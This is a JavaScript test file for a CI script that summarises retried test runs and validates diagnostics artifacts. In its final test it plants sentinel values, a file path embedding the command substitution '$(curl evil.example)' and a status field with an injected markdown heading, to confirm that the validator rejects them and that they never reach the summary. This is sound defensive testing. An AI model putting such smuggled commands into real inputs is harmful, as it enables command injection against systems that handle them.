/* eslint-disable @typescript-eslint/no-require-imports -- Node CLI entry points use CommonJS. */
const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');
const { summarizeRetried, render } = require('./retried-tests-summary.cjs');
const { validateArtifact, validateDirectory } = require('./safe-artifacts.cjs');

/** A record that passes the strict diagnostics validator, with the fields the summary uses overridable */
function validRecord(overrides = {}) {
	return {
		version: 1,
		retry: 0,
		status: 'passed',
		durationMs: 1,
		file: 'tests/models/cardio.spec.ts',
		line: 56,
		steps: [],
		states: [],
		...overrides
	};
}

function writeRecord(dir, name, record) {
	fs.writeFileSync(path.join(dir, name), JSON.stringify(record));
}

test('only tests with more than one attempt are listed, in order, with their outcome', () => {
	const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'myfit-retried-'));
	// Passed first try: not listed
	writeRecord(dir, 'a-retry-0.json', validRecord());
	// Flaky: passed on its retry
	writeRecord(
		dir,
		'b-retry-0.json',
		validRecord({ file: 'tests/models/workouts.spec.ts', line: 515, status: 'timedOut' })
	);
	writeRecord(dir, 'b-retry-1.json', validRecord({ file: 'tests/models/workouts.spec.ts', line: 515, retry: 1 }));
	// Failed even after its retries
	writeRecord(
		dir,
		'c-retry-0.json',
		validRecord({ file: 'tests/models/workouts.spec.ts', line: 67, status: 'failed' })
	);
	writeRecord(
		dir,
		'c-retry-2.json',
		validRecord({ file: 'tests/models/workouts.spec.ts', line: 67, retry: 2, status: 'failed' })
	);
	writeRecord(
		dir,
		'c-retry-1.json',
		validRecord({ file: 'tests/models/workouts.spec.ts', line: 67, retry: 1, status: 'failed' })
	);

	const { entries, missing, rejected } = summarizeRetried(dir);
	assert.equal(missing, false);
	assert.equal(rejected, 0);
	assert.deepEqual(entries, [
		{ where: 'tests/models/workouts.spec.ts:515', attempts: 2, outcome: 'passed on retry' },
		{ where: 'tests/models/workouts.spec.ts:67', attempts: 3, outcome: 'ended failed' }
	]);
	const markdown = render({ entries, missing, rejected });
	assert.match(markdown, /2 test\(s\) needed a retry/);
	assert.match(markdown, /workouts\.spec\.ts:515` — 2 attempts, passed on retry/);
	assert.match(markdown, /workouts\.spec\.ts:67` — 3 attempts, ended failed/);
});

test('a clean run says so, and a missing directory is reported instead of failing the step', () => {
	const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'myfit-retried-clean-'));
	writeRecord(dir, 'a-retry-0.json', validRecord());
	assert.match(render(summarizeRetried(dir)), /No test needed a retry\./);
	assert.match(render(summarizeRetried(path.join(dir, 'absent'))), /No diagnostics found/);
});

test('files that are not diagnostics records are skipped', () => {
	const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'myfit-retried-mixed-'));
	writeRecord(dir, 'not-a-record.json', { hello: 'world' });
	fs.writeFileSync(path.join(dir, 'broken.json'), '{ not json');
	writeRecord(
		dir,
		'b-retry-0.json',
		validRecord({ file: 'tests/models/workouts.spec.ts', line: 515, status: 'failed' })
	);
	writeRecord(dir, 'b-retry-1.json', validRecord({ file: 'tests/models/workouts.spec.ts', line: 515, retry: 1 }));
	const { entries } = summarizeRetried(dir);
	assert.deepEqual(entries, [{ where: 'tests/models/workouts.spec.ts:515', attempts: 2, outcome: 'passed on retry' }]);
});

test('records the strict validator rejects never reach the summary, even on the validation-failure path', () => {
	const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'myfit-retried-sentinel-'));
	// Sentinels with load-bearing fields outside the allowlists, across two "attempts" of one test
	const sentinelFile = 'tests/models/$(curl evil.example)/x.spec.ts';
	const sentinelStatus = 'passed\n\n## injected heading';
	writeRecord(dir, 'd-retry-0.json', validRecord({ file: sentinelFile, line: 1, retry: 0, status: 'failed' }));
	writeRecord(
		dir,
		'd-retry-1.json',
		validRecord({ file: 'tests/models/workouts.spec.ts', line: 9, retry: 1, status: sentinelStatus })
	);

	// The privacy boundary rejects both sentinels...
	for (const name of ['d-retry-0.json', 'd-retry-1.json']) {
		const data = JSON.parse(fs.readFileSync(path.join(dir, name), 'utf8'));
		assert.throws(() => validateArtifact(data));
	}
	assert.throws(() => validateDirectory(dir));

	// ...so the summary must omit them too: nothing from a rejected record is rendered
	const { entries, rejected } = summarizeRetried(dir);
	assert.deepEqual(entries, []);
	assert.equal(rejected, 2);
	const markdown = render(summarizeRetried(dir));
	assert.ok(!markdown.includes('evil.example'), 'rejected file field leaked into the summary');
	assert.ok(!markdown.includes('injected heading'), 'rejected status field leaked into the summary');
	assert.match(markdown, /2 record\(s\) failed the strict diagnostics validator and were omitted\./);
});
